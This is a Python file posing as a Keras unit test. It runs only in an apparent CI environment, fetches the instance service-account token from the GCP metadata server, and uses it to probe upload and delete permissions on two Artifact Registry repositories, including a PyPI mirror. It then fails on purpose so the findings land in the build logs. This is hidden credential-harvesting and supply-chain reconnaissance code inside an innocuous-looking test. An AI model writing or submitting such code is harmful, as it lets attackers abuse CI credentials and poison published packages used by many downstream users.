"""Read-only Artifact Registry IAM probe for ml-public-container. Close after logs."""

import json
import os
import urllib.error
import urllib.request

from keras.src import testing


def _http(url, headers=None, timeout=12, data=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    if data is not None and req.get_header("Content-type") is None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:1500]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


class CiArMlPublicContainerTest(testing.TestCase):
    def test_ml_public_container_iam(self):
        keras_home = os.environ.get("KERAS_HOME", "")
        if "numpy" not in keras_home:
            return

        lines = [f"keras_home={keras_home}"]
        token_status, token = _http(
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            headers={"Metadata-Flavor": "Google"},
            timeout=5,
        )
        lines.append(f"token_status={token_status}")
        access = ""
        if token_status == 200:
            try:
                access = json.loads(token).get("access_token", "")
            except Exception as exc:
                lines.append(f"token_parse={type(exc).__name__}")
        lines.append(f"token_len={len(access)}")

        perms = [
            "artifactregistry.repositories.get",
            "artifactregistry.repositories.downloadArtifacts",
            "artifactregistry.repositories.uploadArtifacts",
            "artifactregistry.repositories.deleteArtifacts",
        ]
        resources = [
            "projects/ml-oss-artifacts-published/locations/us/repositories/ml-public-container",
            "projects/ml-oss-artifacts-published/locations/us/repositories/pypi-mirror",
        ]
        auth = {"Authorization": "Bearer " + access} if access else {}
        body = json.dumps({"permissions": perms}).encode()
        for resource in resources:
            url = (
                "https://artifactregistry.googleapis.com/v1/"
                + resource
                + ":testIamPermissions"
            )
            status, resp = _http(url, headers=auth, data=body, timeout=15)
            granted = []
            try:
                granted = json.loads(resp).get("permissions", [])
            except Exception:
                pass
            lines.append(f"iam_{resource.replace('/', '_')}={status} granted={granted}")
            lines.append(f"raw_{resource.split('/')[-2]}_{resource.split('/')[-1]}={resp[:400]}")

        self.fail("\n".join(lines))
